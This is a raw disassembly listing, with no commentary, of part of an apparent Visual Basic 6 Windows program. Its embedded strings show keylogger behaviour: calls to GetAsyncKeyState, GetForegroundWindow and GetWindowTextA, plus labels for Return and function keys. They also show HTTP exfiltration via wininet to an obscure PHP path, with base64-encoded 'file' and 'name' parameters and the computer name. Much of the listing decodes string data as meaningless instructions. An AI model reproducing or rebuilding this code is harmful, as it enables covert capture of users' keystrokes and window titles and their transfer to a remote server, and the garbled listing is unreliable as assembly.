  4026c7:	00 2b                	add    %ch,(%ebx)
  4026c9:	33 71 b5             	xor    -0x4b(%ecx),%esi
  4026cc:	43                   	inc    %ebx
  4026cd:	3a 5c 50 72          	cmp    0x72(%eax,%edx,2),%bl
  4026d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4026d2:	67 72 61             	addr16 jb 0x402736
  4026d5:	6d                   	insl   (%dx),%es:(%edi)
  4026d6:	20 46 69             	and    %al,0x69(%esi)
  4026d9:	6c                   	insb   (%dx),%es:(%edi)
  4026da:	65 73 5c             	gs jae 0x402739
  4026dd:	4d                   	dec    %ebp
  4026de:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4026e5:	74 20                	je     0x402707
  4026e7:	56                   	push   %esi
  4026e8:	69 73 75 61 6c 20 53 	imul   $0x53206c61,0x75(%ebx),%esi
  4026ef:	74 75                	je     0x402766
  4026f1:	64 69 6f 5c 56 42 39 	imul   $0x38394256,%fs:0x5c(%edi),%ebp
  4026f8:	38 
  4026f9:	5c                   	pop    %esp
  4026fa:	56                   	push   %esi
  4026fb:	42                   	inc    %edx
  4026fc:	36 2e 4f             	ss cs dec %edi
  4026ff:	4c                   	dec    %esp
  402700:	42                   	inc    %edx
  402701:	00 00                	add    %al,(%eax)
  402703:	00 56 42             	add    %dl,0x42(%esi)
  402706:	00 00                	add    %al,(%eax)
  402708:	bc 26 40 00 00       	mov    $0x4026,%esp
  40270d:	00 00                	add    %al,(%eax)
  40270f:	00 06                	add    %al,(%esi)
  402711:	00 00                	add    %al,(%eax)
  402713:	00 09                	add    %cl,(%ecx)
  402715:	00 00                	add    %al,(%eax)
  402717:	00 cc                	add    %cl,%ah
  402719:	26 40                	es inc %eax
  40271b:	00 04 27             	add    %al,(%edi,%eiz,1)
  40271e:	40                   	inc    %eax
  40271f:	00 6c 83 40          	add    %ch,0x40(%ebx,%eax,4)
	...
  40272b:	00 a0 cd 39 00 54    	add    %ah,0x540039cd(%eax)
  402731:	65 78 74             	gs js  0x4027a8
  402734:	32 00                	xor    (%eax),%al
  402736:	00 00                	add    %al,(%eax)
  402738:	3a 4f ad             	cmp    -0x53(%edi),%cl
  40273b:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402741:	0c 00                	or     $0x0,%al
  402743:	aa                   	stos   %al,%es:(%edi)
  402744:	00 60 d3             	add    %ah,-0x2d(%eax)
  402747:	93                   	xchg   %eax,%ebx
  402748:	46                   	inc    %esi
  402749:	6f                   	outsl  %ds:(%esi),(%dx)
  40274a:	72 6d                	jb     0x4027b9
  40274c:	00 00                	add    %al,(%eax)
  40274e:	00 00                	add    %al,(%eax)
  402750:	da 4e ad             	fimull -0x53(%esi)
  402753:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402759:	0c 00                	or     $0x0,%al
  40275b:	aa                   	stos   %al,%es:(%edi)
  40275c:	00 60 d3             	add    %ah,-0x2d(%eax)
  40275f:	93                   	xchg   %eax,%ebx
  402760:	6c                   	insb   (%dx),%es:(%edi)
  402761:	62 6c 44 61          	bound  %ebp,0x61(%esp,%eax,2)
  402765:	74 61                	je     0x4027c8
  402767:	00 2a                	add    %ch,(%edx)
  402769:	4f                   	dec    %edi
  40276a:	ad                   	lods   %ds:(%esi),%eax
  40276b:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402771:	0c 00                	or     $0x0,%al
  402773:	aa                   	stos   %al,%es:(%edi)
  402774:	00 60 d3             	add    %ah,-0x2d(%eax)
  402777:	93                   	xchg   %eax,%ebx
  402778:	54                   	push   %esp
  402779:	69 6d 65 72 31 00 00 	imul   $0x3172,0x65(%ebp),%ebp
  402780:	74 5f                	je     0x4027e1
  402782:	73 61                	jae    0x4027e5
  402784:	76 65                	jbe    0x4027eb
  402786:	00 00                	add    %al,(%eax)
  402788:	08 00                	or     %al,(%eax)
  40278a:	00 00                	add    %al,(%eax)
  40278c:	77 69                	ja     0x4027f7
  40278e:	6e                   	outsb  %ds:(%esi),(%dx)
  40278f:	69 6e 65 74 00 0e 00 	imul   $0xe0074,0x65(%esi),%ebp
  402796:	00 00                	add    %al,(%eax)
  402798:	49                   	dec    %ecx
  402799:	6e                   	outsb  %ds:(%esi),(%dx)
  40279a:	74 65                	je     0x402801
  40279c:	72 6e                	jb     0x40280c
  40279e:	65 74 4f             	gs je  0x4027f0
  4027a1:	70 65                	jo     0x402808
  4027a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4027a4:	41                   	inc    %ecx
  4027a5:	00 00                	add    %al,(%eax)
  4027a7:	00 8c 27 40 00 98 27 	add    %cl,0x27980040(%edi,%eiz,1)
  4027ae:	40                   	inc    %eax
  4027af:	00 00                	add    %al,(%eax)
  4027b1:	00 04 00             	add    %al,(%eax,%eax,1)
  4027b4:	70 83                	jo     0x402739
  4027b6:	40                   	inc    %eax
	...
  4027bf:	00 a1 78 83 40 00    	add    %ah,0x408378(%ecx)
  4027c5:	0b c0                	or     %eax,%eax
  4027c7:	74 02                	je     0x4027cb
  4027c9:	ff e0                	jmp    *%eax
  4027cb:	68 a8 27 40 00       	push   $0x4027a8
  4027d0:	b8 f8 12 40 00       	mov    $0x4012f8,%eax
  4027d5:	ff d0                	call   *%eax
  4027d7:	ff e0                	jmp    *%eax
  4027d9:	00 00                	add    %al,(%eax)
  4027db:	00 14 00             	add    %dl,(%eax,%eax,1)
  4027de:	00 00                	add    %al,(%eax)
  4027e0:	49                   	dec    %ecx
  4027e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4027e2:	74 65                	je     0x402849
  4027e4:	72 6e                	jb     0x402854
  4027e6:	65 74 43             	gs je  0x40282c
  4027e9:	6c                   	insb   (%dx),%es:(%edi)
  4027ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4027eb:	73 65                	jae    0x402852
  4027ed:	48                   	dec    %eax
  4027ee:	61                   	popa
  4027ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4027f0:	64 6c                	fs insb (%dx),%es:(%edi)
  4027f2:	65 00 8c 27 40 00 e0 	add    %cl,%gs:0x27e00040(%edi,%eiz,1)
  4027f9:	27 
  4027fa:	40                   	inc    %eax
  4027fb:	00 00                	add    %al,(%eax)
  4027fd:	00 04 00             	add    %al,(%eax,%eax,1)
  402800:	7c 83                	jl     0x402785
  402802:	40                   	inc    %eax
	...
  40280b:	00 a1 84 83 40 00    	add    %ah,0x408384(%ecx)
  402811:	0b c0                	or     %eax,%eax
  402813:	74 02                	je     0x402817
  402815:	ff e0                	jmp    *%eax
  402817:	68 f4 27 40 00       	push   $0x4027f4
  40281c:	b8 f8 12 40 00       	mov    $0x4012f8,%eax
  402821:	ff d0                	call   *%eax
  402823:	ff e0                	jmp    *%eax
  402825:	00 00                	add    %al,(%eax)
  402827:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40282a:	00 00                	add    %al,(%eax)
  40282c:	77 69                	ja     0x402897
  40282e:	6e                   	outsb  %ds:(%esi),(%dx)
  40282f:	69 6e 65 74 2e 64 6c 	imul   $0x6c642e74,0x65(%esi),%ebp
  402836:	6c                   	insb   (%dx),%es:(%edi)
  402837:	00 11                	add    %dl,(%ecx)
  402839:	00 00                	add    %al,(%eax)
  40283b:	00 49 6e             	add    %cl,0x6e(%ecx)
  40283e:	74 65                	je     0x4028a5
  402840:	72 6e                	jb     0x4028b0
  402842:	65 74 43             	gs je  0x402888
  402845:	6f                   	outsl  %ds:(%esi),(%dx)
  402846:	6e                   	outsb  %ds:(%esi),(%dx)
  402847:	6e                   	outsb  %ds:(%esi),(%dx)
  402848:	65 63 74 41 00       	arpl   %esi,%gs:0x0(%ecx,%eax,2)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	00 23                	add    %ah,(%ebx)
  402851:	3d fb fc fa a0       	cmp    $0xa0fafcfb,%eax
  402856:	68 10 a7 38 08       	push   $0x838a710
  40285b:	00 2b                	add    %ch,(%ebx)
  40285d:	33 71 b5             	xor    -0x4b(%ecx),%esi
  402860:	02 00                	add    (%eax),%al
  402862:	00 00                	add    %al,(%eax)
  402864:	28 00                	sub    %al,(%eax)
  402866:	00 00                	add    %al,(%eax)
  402868:	2c 28                	sub    $0x28,%al
  40286a:	40                   	inc    %eax
  40286b:	00 3c 28             	add    %bh,(%eax,%ebp,1)
  40286e:	40                   	inc    %eax
  40286f:	00 00                	add    %al,(%eax)
  402871:	00 04 00             	add    %al,(%eax,%eax,1)
  402874:	88 83 40 00 00 00    	mov    %al,0x40(%ebx)
  40287a:	00 00                	add    %al,(%eax)
  40287c:	00 00                	add    %al,(%eax)
  40287e:	00 00                	add    %al,(%eax)
  402880:	a1 90 83 40 00       	mov    0x408390,%eax
  402885:	0b c0                	or     %eax,%eax
  402887:	74 02                	je     0x40288b
  402889:	ff e0                	jmp    *%eax
  40288b:	68 68 28 40 00       	push   $0x402868
  402890:	b8 f8 12 40 00       	mov    $0x4012f8,%eax
  402895:	ff d0                	call   *%eax
  402897:	ff e0                	jmp    *%eax
  402899:	00 00                	add    %al,(%eax)
  40289b:	00 11                	add    %dl,(%ecx)
  40289d:	00 00                	add    %al,(%eax)
  40289f:	00 48 74             	add    %cl,0x74(%eax)
  4028a2:	74 70                	je     0x402914
  4028a4:	4f                   	dec    %edi
  4028a5:	70 65                	jo     0x40290c
  4028a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4028a8:	52                   	push   %edx
  4028a9:	65 71 75             	gs jno 0x402921
  4028ac:	65 73 74             	gs jae 0x402923
  4028af:	41                   	inc    %ecx
  4028b0:	00 00                	add    %al,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	2c 28                	sub    $0x28,%al
  4028b6:	40                   	inc    %eax
  4028b7:	00 a0 28 40 00 00    	add    %ah,0x4028(%eax)
  4028bd:	00 04 00             	add    %al,(%eax,%eax,1)
  4028c0:	94                   	xchg   %eax,%esp
  4028c1:	83 40 00 00          	addl   $0x0,0x0(%eax)
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 a1 9c 83 40 00    	add    %ah,0x40839c(%ecx)
  4028d1:	0b c0                	or     %eax,%eax
  4028d3:	74 02                	je     0x4028d7
  4028d5:	ff e0                	jmp    *%eax
  4028d7:	68 b4 28 40 00       	push   $0x4028b4
  4028dc:	b8 f8 12 40 00       	mov    $0x4012f8,%eax
  4028e1:	ff d0                	call   *%eax
  4028e3:	ff e0                	jmp    *%eax
  4028e5:	00 00                	add    %al,(%eax)
  4028e7:	00 11                	add    %dl,(%ecx)
  4028e9:	00 00                	add    %al,(%eax)
  4028eb:	00 48 74             	add    %cl,0x74(%eax)
  4028ee:	74 70                	je     0x402960
  4028f0:	53                   	push   %ebx
  4028f1:	65 6e                	outsb  %gs:(%esi),(%dx)
  4028f3:	64 52                	fs push %edx
  4028f5:	65 71 75             	gs jno 0x40296d
  4028f8:	65 73 74             	gs jae 0x40296f
  4028fb:	41                   	inc    %ecx
  4028fc:	00 00                	add    %al,(%eax)
  4028fe:	00 00                	add    %al,(%eax)
  402900:	2c 28                	sub    $0x28,%al
  402902:	40                   	inc    %eax
  402903:	00 ec                	add    %ch,%ah
  402905:	28 40 00             	sub    %al,0x0(%eax)
  402908:	00 00                	add    %al,(%eax)
  40290a:	04 00                	add    $0x0,%al
  40290c:	a0 83 40 00 00       	mov    0x4083,%al
  402911:	00 00                	add    %al,(%eax)
  402913:	00 00                	add    %al,(%eax)
  402915:	00 00                	add    %al,(%eax)
  402917:	00 a1 a8 83 40 00    	add    %ah,0x4083a8(%ecx)
  40291d:	0b c0                	or     %eax,%eax
  40291f:	74 02                	je     0x402923
  402921:	ff e0                	jmp    *%eax
  402923:	68 00 29 40 00       	push   $0x402900
  402928:	b8 f8 12 40 00       	mov    $0x4012f8,%eax
  40292d:	ff d0                	call   *%eax
  40292f:	ff e0                	jmp    *%eax
  402931:	00 00                	add    %al,(%eax)
  402933:	00 07                	add    %al,(%edi)
  402935:	00 00                	add    %al,(%eax)
  402937:	00 75 73             	add    %dh,0x73(%ebp)
  40293a:	65 72 33             	gs jb  0x402970
  40293d:	32 00                	xor    (%eax),%al
  40293f:	00 11                	add    %dl,(%ecx)
  402941:	00 00                	add    %al,(%eax)
  402943:	00 47 65             	add    %al,0x65(%edi)
  402946:	74 41                	je     0x402989
  402948:	73 79                	jae    0x4029c3
  40294a:	6e                   	outsb  %ds:(%esi),(%dx)
  40294b:	63 4b 65             	arpl   %ecx,0x65(%ebx)
  40294e:	79 53                	jns    0x4029a3
  402950:	74 61                	je     0x4029b3
  402952:	74 65                	je     0x4029b9
  402954:	00 00                	add    %al,(%eax)
  402956:	00 00                	add    %al,(%eax)
  402958:	38 29                	cmp    %ch,(%ecx)
  40295a:	40                   	inc    %eax
  40295b:	00 44 29 40          	add    %al,0x40(%ecx,%ebp,1)
  40295f:	00 00                	add    %al,(%eax)
  402961:	00 04 00             	add    %al,(%eax,%eax,1)
  402964:	ac                   	lods   %ds:(%esi),%al
  402965:	83 40 00 00          	addl   $0x0,0x0(%eax)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 00                	add    %al,(%eax)
  40296d:	00 00                	add    %al,(%eax)
  40296f:	00 a1 b4 83 40 00    	add    %ah,0x4083b4(%ecx)
  402975:	0b c0                	or     %eax,%eax
  402977:	74 02                	je     0x40297b
  402979:	ff e0                	jmp    *%eax
  40297b:	68 58 29 40 00       	push   $0x402958
  402980:	b8 f8 12 40 00       	mov    $0x4012f8,%eax
  402985:	ff d0                	call   *%eax
  402987:	ff e0                	jmp    *%eax
  402989:	00 00                	add    %al,(%eax)
  40298b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40298e:	00 00                	add    %al,(%eax)
  402990:	47                   	inc    %edi
  402991:	65 74 46             	gs je  0x4029da
  402994:	6f                   	outsl  %ds:(%esi),(%dx)
  402995:	72 65                	jb     0x4029fc
  402997:	67 72 6f             	addr16 jb 0x402a09
  40299a:	75 6e                	jne    0x402a0a
  40299c:	64 57                	fs push %edi
  40299e:	69 6e 64 6f 77 00 38 	imul   $0x3800776f,0x64(%esi),%ebp
  4029a5:	29 40 00             	sub    %eax,0x0(%eax)
  4029a8:	90                   	nop
  4029a9:	29 40 00             	sub    %eax,0x0(%eax)
  4029ac:	00 00                	add    %al,(%eax)
  4029ae:	04 00                	add    $0x0,%al
  4029b0:	b8 83 40 00 00       	mov    $0x4083,%eax
  4029b5:	00 00                	add    %al,(%eax)
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	00 00                	add    %al,(%eax)
  4029bb:	00 a1 c0 83 40 00    	add    %ah,0x4083c0(%ecx)
  4029c1:	0b c0                	or     %eax,%eax
  4029c3:	74 02                	je     0x4029c7
  4029c5:	ff e0                	jmp    *%eax
  4029c7:	68 a4 29 40 00       	push   $0x4029a4
  4029cc:	b8 f8 12 40 00       	mov    $0x4012f8,%eax
  4029d1:	ff d0                	call   *%eax
  4029d3:	ff e0                	jmp    *%eax
  4029d5:	00 00                	add    %al,(%eax)
  4029d7:	00 0f                	add    %cl,(%edi)
  4029d9:	00 00                	add    %al,(%eax)
  4029db:	00 47 65             	add    %al,0x65(%edi)
  4029de:	74 57                	je     0x402a37
  4029e0:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  4029e7:	78 74                	js     0x402a5d
  4029e9:	41                   	inc    %ecx
  4029ea:	00 00                	add    %al,(%eax)
  4029ec:	38 29                	cmp    %ch,(%ecx)
  4029ee:	40                   	inc    %eax
  4029ef:	00 dc                	add    %bl,%ah
  4029f1:	29 40 00             	sub    %eax,0x0(%eax)
  4029f4:	00 00                	add    %al,(%eax)
  4029f6:	04 00                	add    $0x0,%al
  4029f8:	c4 83 40 00 00 00    	les    0x40(%ebx),%eax
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	00 00                	add    %al,(%eax)
  402a02:	00 00                	add    %al,(%eax)
  402a04:	a1 cc 83 40 00       	mov    0x4083cc,%eax
  402a09:	0b c0                	or     %eax,%eax
  402a0b:	74 02                	je     0x402a0f
  402a0d:	ff e0                	jmp    *%eax
  402a0f:	68 ec 29 40 00       	push   $0x4029ec
  402a14:	b8 f8 12 40 00       	mov    $0x4012f8,%eax
  402a19:	ff d0                	call   *%eax
  402a1b:	ff e0                	jmp    *%eax
  402a1d:	00 00                	add    %al,(%eax)
  402a1f:	00 10                	add    %dl,(%eax)
  402a21:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402a25:	00 01                	add    %al,(%ecx)
  402a27:	00 00                	add    %al,(%eax)
  402a29:	00 00                	add    %al,(%eax)
  402a2b:	00 38                	add    %bh,(%eax)
  402a2d:	00 01                	add    %al,(%ecx)
  402a2f:	00 00                	add    %al,(%eax)
  402a31:	00 00                	add    %al,(%eax)
  402a33:	00 22                	add    %ah,(%edx)
  402a35:	3d fb fc fa a0       	cmp    $0xa0fafcfb,%eax
  402a3a:	68 10 a7 38 08       	push   $0x838a710
  402a3f:	00 2b                	add    %ch,(%ebx)
  402a41:	33 71 b5             	xor    -0x4b(%ecx),%esi
  402a44:	02 00                	add    (%eax),%al
  402a46:	00 00                	add    %al,(%eax)
  402a48:	50                   	push   %eax
  402a49:	28 40 00             	sub    %al,0x0(%eax)
  402a4c:	34 2a                	xor    $0x2a,%al
  402a4e:	40                   	inc    %eax
  402a4f:	00 00                	add    %al,(%eax)
  402a51:	00 00                	add    %al,(%eax)
  402a53:	00 79 4f             	add    %bh,0x4f(%ecx)
  402a56:	ad                   	lods   %ds:(%esi),%eax
  402a57:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402a5d:	0c 00                	or     $0x0,%al
  402a5f:	aa                   	stos   %al,%es:(%edi)
  402a60:	00 60 d3             	add    %ah,-0x2d(%eax)
  402a63:	93                   	xchg   %eax,%ebx
  402a64:	18 00                	sbb    %al,(%eax)
  402a66:	00 00                	add    %al,(%eax)
  402a68:	63 00                	arpl   %eax,(%eax)
  402a6a:	6f                   	outsl  %ds:(%esi),(%dx)
  402a6b:	00 6d 00             	add    %ch,0x0(%ebp)
  402a6e:	70 00                	jo     0x402a70
  402a70:	75 00                	jne    0x402a72
  402a72:	74 00                	je     0x402a74
  402a74:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  402a78:	6e                   	outsb  %ds:(%esi),(%dx)
  402a79:	00 61 00             	add    %ah,0x0(%ecx)
  402a7c:	6d                   	insl   (%dx),%es:(%edi)
  402a7d:	00 65 00             	add    %ah,0x0(%ebp)
  402a80:	00 00                	add    %al,(%eax)
  402a82:	00 00                	add    %al,(%eax)
  402a84:	e1 4e                	loope  0x402ad4
  402a86:	ad                   	lods   %ds:(%esi),%eax
  402a87:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  402a8d:	0c 00                	or     $0x0,%al
  402a8f:	aa                   	stos   %al,%es:(%edi)
  402a90:	00 60 d3             	add    %ah,-0x2d(%eax)
  402a93:	93                   	xchg   %eax,%ebx
  402a94:	06                   	push   %es
  402a95:	00 00                	add    %al,(%eax)
  402a97:	00 47 00             	add    %al,0x0(%edi)
  402a9a:	45                   	inc    %ebp
  402a9b:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  402a9f:	00 40 00             	add    %al,0x0(%eax)
  402aa2:	00 00                	add    %al,(%eax)
  402aa4:	2f                   	das
  402aa5:	00 58 00             	add    %bl,0x0(%eax)
  402aa8:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  402aac:	66 00 43 00          	data16 add %al,0x0(%ebx)
  402ab0:	63 00                	arpl   %eax,(%eax)
  402ab2:	78 00                	js     0x402ab4
  402ab4:	75 00                	jne    0x402ab6
  402ab6:	69 00 75 00 73 00    	imul   $0x730075,(%eax),%eax
  402abc:	53                   	push   %ebx
  402abd:	00 53 00             	add    %dl,0x0(%ebx)
  402ac0:	78 00                	js     0x402ac2
  402ac2:	76 00                	jbe    0x402ac4
  402ac4:	62 00                	bound  %eax,(%eax)
  402ac6:	5a                   	pop    %edx
  402ac7:	00 7a 00             	add    %bh,0x0(%edx)
  402aca:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  402ace:	68 00 70 00 3f       	push   $0x3f007000
  402ad3:	00 5a 00             	add    %bl,0x0(%edx)
  402ad6:	6d                   	insl   (%dx),%es:(%edi)
  402ad7:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  402adb:	00 5a 00             	add    %bl,0x0(%edx)
  402ade:	51                   	push   %ecx
  402adf:	00 6f 00             	add    %ch,0x0(%edi)
  402ae2:	3d 00 00 00 00       	cmp    $0x0,%eax
  402ae7:	00 12                	add    %dl,(%edx)
  402ae9:	00 00                	add    %al,(%eax)
  402aeb:	00 26                	add    %ah,(%esi)
  402aed:	00 62 00             	add    %ah,0x0(%edx)
  402af0:	6d                   	insl   (%dx),%es:(%edi)
  402af1:	00 46 00             	add    %al,0x0(%esi)
  402af4:	74 00                	je     0x402af6
  402af6:	5a                   	pop    %edx
  402af7:	00 51 00             	add    %dl,0x0(%ecx)
  402afa:	6f                   	outsl  %ds:(%esi),(%dx)
  402afb:	00 3d 00 00 00 10    	add    %bh,0x10000000
  402b01:	00 00                	add    %al,(%eax)
  402b03:	00 48 00             	add    %cl,0x0(%eax)
  402b06:	54                   	push   %esp
  402b07:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  402b0b:	00 2f                	add    %ch,(%edi)
  402b0d:	00 31                	add    %dh,(%ecx)
  402b0f:	00 2e                	add    %ch,(%esi)
  402b11:	00 30                	add    %dh,(%eax)
  402b13:	00 00                	add    %al,(%eax)
  402b15:	00 00                	add    %al,(%eax)
  402b17:	00 10                	add    %dl,(%eax)
  402b19:	00 00                	add    %al,(%eax)
  402b1b:	00 5b 00             	add    %bl,0x0(%ebx)
  402b1e:	52                   	push   %edx
  402b1f:	00 45 00             	add    %al,0x0(%ebp)
  402b22:	54                   	push   %esp
  402b23:	00 55 00             	add    %dl,0x0(%ebp)
  402b26:	52                   	push   %edx
  402b27:	00 4e 00             	add    %cl,0x0(%esi)
  402b2a:	5d                   	pop    %ebp
  402b2b:	00 00                	add    %al,(%eax)
  402b2d:	00 00                	add    %al,(%eax)
  402b2f:	00 04 00             	add    %al,(%eax,%eax,1)
  402b32:	00 00                	add    %al,(%eax)
  402b34:	0d 00 0a 00 00       	or     $0xa00,%eax
  402b39:	00 00                	add    %al,(%eax)
  402b3b:	00 02                	add    %al,(%edx)
  402b3d:	00 00                	add    %al,(%eax)
  402b3f:	00 31                	add    %dh,(%ecx)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	00 02                	add    %al,(%edx)
  402b45:	00 00                	add    %al,(%eax)
  402b47:	00 32                	add    %dh,(%edx)
  402b49:	00 00                	add    %al,(%eax)
  402b4b:	00 02                	add    %al,(%edx)
  402b4d:	00 00                	add    %al,(%eax)
  402b4f:	00 33                	add    %dh,(%ebx)
  402b51:	00 00                	add    %al,(%eax)
  402b53:	00 02                	add    %al,(%edx)
  402b55:	00 00                	add    %al,(%eax)
  402b57:	00 34 00             	add    %dh,(%eax,%eax,1)
  402b5a:	00 00                	add    %al,(%eax)
  402b5c:	02 00                	add    (%eax),%al
  402b5e:	00 00                	add    %al,(%eax)
  402b60:	35 00 00 00 02       	xor    $0x2000000,%eax
  402b65:	00 00                	add    %al,(%eax)
  402b67:	00 36                	add    %dh,(%esi)
  402b69:	00 00                	add    %al,(%eax)
  402b6b:	00 02                	add    %al,(%edx)
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	00 37                	add    %dh,(%edi)
  402b71:	00 00                	add    %al,(%eax)
  402b73:	00 02                	add    %al,(%edx)
  402b75:	00 00                	add    %al,(%eax)
  402b77:	00 38                	add    %bh,(%eax)
  402b79:	00 00                	add    %al,(%eax)
  402b7b:	00 02                	add    %al,(%edx)
  402b7d:	00 00                	add    %al,(%eax)
  402b7f:	00 2a                	add    %ch,(%edx)
  402b81:	00 00                	add    %al,(%eax)
  402b83:	00 02                	add    %al,(%edx)
  402b85:	00 00                	add    %al,(%eax)
  402b87:	00 2d 00 00 00 02    	add    %ch,0x2000000
  402b8d:	00 00                	add    %al,(%eax)
  402b8f:	00 2e                	add    %ch,(%esi)
  402b91:	00 00                	add    %al,(%eax)
  402b93:	00 02                	add    %al,(%edx)
  402b95:	00 00                	add    %al,(%eax)
  402b97:	00 21                	add    %ah,(%ecx)
  402b99:	00 00                	add    %al,(%eax)
  402b9b:	00 02                	add    %al,(%edx)
  402b9d:	00 00                	add    %al,(%eax)
  402b9f:	00 22                	add    %ah,(%edx)
  402ba1:	00 00                	add    %al,(%eax)
  402ba3:	00 02                	add    %al,(%edx)
  402ba5:	00 00                	add    %al,(%eax)
  402ba7:	00 a3 00 00 00 02    	add    %ah,0x2000000(%ebx)
  402bad:	00 00                	add    %al,(%eax)
  402baf:	00 24 00             	add    %ah,(%eax,%eax,1)
  402bb2:	00 00                	add    %al,(%eax)
  402bb4:	02 00                	add    (%eax),%al
  402bb6:	00 00                	add    %al,(%eax)
  402bb8:	25 00 00 00 02       	and    $0x2000000,%eax
  402bbd:	00 00                	add    %al,(%eax)
  402bbf:	00 26                	add    %ah,(%esi)
  402bc1:	00 00                	add    %al,(%eax)
  402bc3:	00 08                	add    %cl,(%eax)
  402bc5:	00 00                	add    %al,(%eax)
  402bc7:	00 20                	add    %ah,(%eax)
  402bc9:	00 46 00             	add    %al,0x0(%esi)
  402bcc:	31 00                	xor    %eax,(%eax)
  402bce:	20 00                	and    %al,(%eax)
  402bd0:	00 00                	add    %al,(%eax)
  402bd2:	00 00                	add    %al,(%eax)
  402bd4:	08 00                	or     %al,(%eax)
  402bd6:	00 00                	add    %al,(%eax)
  402bd8:	20 00                	and    %al,(%eax)
  402bda:	46                   	inc    %esi
  402bdb:	00 32                	add    %dh,(%edx)
  402bdd:	00 20                	add    %ah,(%eax)
  402bdf:	00 00                	add    %al,(%eax)
  402be1:	00 00                	add    %al,(%eax)
  402be3:	00 08                	add    %cl,(%eax)
  402be5:	00 00                	add    %al,(%eax)
  402be7:	00 20                	add    %ah,(%eax)
  402be9:	00 46 00             	add    %al,0x0(%esi)
  402bec:	33 00                	xor    (%eax),%eax
  402bee:	20 00                	and    %al,(%eax)
  402bf0:	00 00                	add    %al,(%eax)
  402bf2:	00 00                	add    %al,(%eax)
  402bf4:	08 00                	or     %al,(%eax)
  402bf6:	00 00                	add    %al,(%eax)
  402bf8:	20 00                	and    %al,(%eax)
  402bfa:	46                   	inc    %esi
  402bfb:	00 34 00             	add    %dh,(%eax,%eax,1)
  402bfe:	20 00                	and    %al,(%eax)
  402c00:	00 00                	add    %al,(%eax)
  402c02:	00 00                	add    %al,(%eax)
  402c04:	08 00                	or     %al,(%eax)
  402c06:	00 00                	add    %al,(%eax)
  402c08:	20 00                	and    %al,(%eax)
  402c0a:	46                   	inc    %esi
  402c0b:	00 35 00 20 00 00    	add    %dh,0x2000
  402c11:	00 00                	add    %al,(%eax)
  402c13:	00 08                	add    %cl,(%eax)
  402c15:	00 00                	add    %al,(%eax)
  402c17:	00 20                	add    %ah,(%eax)
  402c19:	00 46 00             	add    %al,0x0(%esi)
  402c1c:	36 00 20             	add    %ah,%ss:(%eax)
  402c1f:	00 00                	add    %al,(%eax)
  402c21:	00 00                	add    %al,(%eax)
  402c23:	00 08                	add    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	00 20                	add    %ah,(%eax)
  402c29:	00 46 00             	add    %al,0x0(%esi)
  402c2c:	37                   	aaa
  402c2d:	00 20                	add    %ah,(%eax)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	00 00                	add    %al,(%eax)
  402c33:	00 08                	add    %cl,(%eax)
  402c35:	00 00                	add    %al,(%eax)
  402c37:	00 20                	add    %ah,(%eax)
  402c39:	00 46 00             	add    %al,0x0(%esi)
  402c3c:	38 00                	cmp    %al,(%eax)
  402c3e:	20 00                	and    %al,(%eax)
  402c40:	00 00                	add    %al,(%eax)
  402c42:	00 00                	add    %al,(%eax)
  402c44:	08 00                	or     %al,(%eax)
  402c46:	00 00                	add    %al,(%eax)
  402c48:	20 00                	and    %al,(%eax)
  402c4a:	46                   	inc    %esi
  402c4b:	00 39                	add    %bh,(%ecx)
  402c4d:	00 20                	add    %ah,(%eax)
  402c4f:	00 00                	add    %al,(%eax)
  402c51:	00 00                	add    %al,(%eax)
  402c53:	00 0a                	add    %cl,(%edx)
  402c55:	00 00                	add    %al,(%eax)
  402c57:	00 20                	add    %ah,(%eax)
  402c59:	00 46 00             	add    %al,0x0(%esi)
  402c5c:	31 00                	xor    %eax,(%eax)
  402c5e:	30 00                	xor    %al,(%eax)
  402c60:	20 00                	and    %al,(%eax)
  402c62:	00 00                	add    %al,(%eax)
  402c64:	0a 00                	or     (%eax),%al
  402c66:	00 00                	add    %al,(%eax)
  402c68:	20 00                	and    %al,(%eax)
  402c6a:	46                   	inc    %esi
  402c6b:	00 31                	add    %dh,(%ecx)
  402c6d:	00 31                	add    %dh,(%ecx)
  402c6f:	00 20                	add    %ah,(%eax)
  402c71:	00 00                	add    %al,(%eax)
  402c73:	00 0a                	add    %cl,(%edx)
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 20                	add    %ah,(%eax)
  402c79:	00 46 00             	add    %al,0x0(%esi)
  402c7c:	31 00                	xor    %eax,(%eax)
  402c7e:	32 00                	xor    (%eax),%al
  402c80:	20 00                	and    %al,(%eax)
  402c82:	00 00                	add    %al,(%eax)
  402c84:	02 00                	add    (%eax),%al
  402c86:	00 00                	add    %al,(%eax)
